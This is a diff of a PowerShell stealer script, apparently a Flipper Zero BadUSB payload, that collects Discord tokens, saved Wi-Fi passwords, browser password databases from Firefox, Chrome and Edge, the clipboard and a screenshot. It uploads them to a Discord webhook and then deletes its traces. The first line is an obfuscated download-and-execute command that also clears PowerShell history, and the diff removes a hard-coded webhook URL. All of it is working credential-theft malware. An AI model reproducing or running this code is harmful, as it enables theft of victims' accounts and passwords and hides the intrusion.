@@ -2,7 +2,7 @@
 #$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
 
 #CHANGE URL TO YOUR URL
-  $url="https://canary.discord.com/api/webhooks/1006310197138034879/wuP_7m5tT1mhHNYIIHrOCl_01AbTQfuyvUc8kweGbokK9TaOUbj0von3LW9HAmyqiZxY" ;
+  $url="" ;
 #Get PC Name+Date+Time
   $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
 
@@ -18,23 +18,30 @@ cd "$env:temp";
   $compress = @{
     Path = "C:\Users\$env:UserName\AppData\Roaming\discord\Local Storage\", "C:\Users\$env:UserName\AppData\Roaming\discord\Local State", "C:\Users\$env:UserName\AppData\Local\Discord\installer.db"
     CompressionLevel = "Fastest"
-    DestinationPath = "$env:temp\$namepc-Discord-Token.zip"
+    DestinationPath = "$env:temp\Discord-Token-$namepc.zip"
   }
   Compress-Archive @compress -Update
 #Define zip to copy
-$tokenfile = "$env:temp\$namepc-Discord-Token.zip"
+$tokenfile = "$env:temp\Discord-Token-$namepc.zip"
 
 # Get PC information + Wifi Password(if register)
-dir env: >> "stats-$namepc.txt";
+  dir env: >> "stats-$namepc.txt";
+# Get public IP
+  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
+  echo "PUBLIC IP: $pubip" >> "stats-$namepc.txt";
+# Get Local IP
 ipconfig /all >> "stats-$namepc.txt";
-Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "stats-$namepc.txt";
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
-$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();
-$_} | %{[PSCustomObject]@{PROFILE_NAME=$name;
-PASSWORD=$pass}} | Format-Table -AutoSize >> "stats-$namepc.txt";
-
-$Body=@{ content = "$env:computername Stats from Flipper-Zero"};
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+# Wifi Password
+  echo "Get wifi password if exist:" >> "stats-$namepc.txt";
+  Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "stats-$namepc.txt";
+  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
+  $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();
+  $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;
+  PASSWORD=$pass}} | Format-Table -AutoSize >> "stats-$namepc.txt";
+# List all installed Software
+  echo "Installed Software:" >> "stats-$namepc.txt";
+  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "stats-$namepc.txt";
+  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "stats-$namepc.txt";
 # Get PC ClipBoard
 echo "" >> "stats-$namepc.txt";
 echo "####PC ClipBoard under this line:" >> "stats-$namepc.txt";
@@ -66,9 +73,65 @@ function Get-ScreenCapture
 Get-ScreenCapture
 $screencapture = echo $env:temp"\"$env:UserName"_Capture"
 
+#Get FireFox Password
+  #firefox ZIP
+    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
+  #Kill Firefox
+    taskkill /IM firefox.exe /F
+  #Compress firefox files where stored passwords
+  $compress = @{
+    Path = "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\logins.json"
+    CompressionLevel = "Fastest"
+    DestinationPath = "$env:temp\Firefox-Password-$namepc.zip"
+  }
+  Compress-Archive @compress -Update
+#Define zip to copy
+$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip"
+
+#Get Chrome Password
+  #Chrome ZIP
+    Add-Type -Assembly "System.IO.Compression.FileSystem";
+  #Kill Chrome
+    taskkill /IM chrome.exe /F
+    sleep 1
+  #Compress chrome files where stored passwords
+  $compress = @{
+    Path = "$env:appdata\..\local\Google\Chrome\User Data\Local State", "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data", "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
+    CompressionLevel = "Fastest"
+    DestinationPath = "$env:temp\Chrome-Password-$namepc.zip"
+  }
+  Compress-Archive @compress -Update
+  sleep 1
+#Define zip to copy
+$chromepassword = "$env:temp\Chrome-Password-$namepc.zip"
+
+#Get Edge Password
+  #Edge ZIP
+    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
+  #Kill Edge
+    taskkill /IM msedge.exe /F
+  #Compress Edge files where stored passwords
+  $compress = @{
+    Path = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
+    CompressionLevel = "Fastest"
+    DestinationPath = "$env:temp\Edge-Password-$namepc.zip"
+  }
+  Compress-Archive @compress -Update
+#Define zip to copy
+$edgepassword = "$env:temp\Edge-Password-$namepc.zip"
+
 #UPLOAD
+# Send Name Computer to discord
+  $Body=@{ content = "Stats from Flipper-Zero, User: admin, on computer: DESKTOP-A6E5GL0"};
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
 # Upload Discord Token
   curl.exe -i -F file=@"$tokenfile" $url
+# Upload firefox password
+  curl.exe -i -F file=@"$firefoxpassword" $url
+# Upload chrome password
+  curl.exe -i -F file=@"$chromepassword" $url
+# Upload Edge password
+  curl.exe -i -F file=@"$edgepassword" $url
 # Upload Stat
   curl.exe -F "file1=@stats-$namepc.txt" $url;
 # Upload screenshot
@@ -76,9 +139,15 @@ $screencapture = echo $env:temp"\"$env:UserName"_Capture"
 
 #Delete
 # Delete ZIP Discord Token
-del "$tokenfile"
+  del "$tokenfile"
 # Delete stat
-del "stats-$namepc.txt" ;
+  del "stats-$namepc.txt";
 # Delete screenshot
-del $screencapture* ;
-exit
+  del $screencapture*;
+# Delete firefox password
+  del $firefoxpassword;
+# Delete Chrome password
+  del $chromepassword;
+# Delete Edge password
+  del $edgepassword;
+exit;
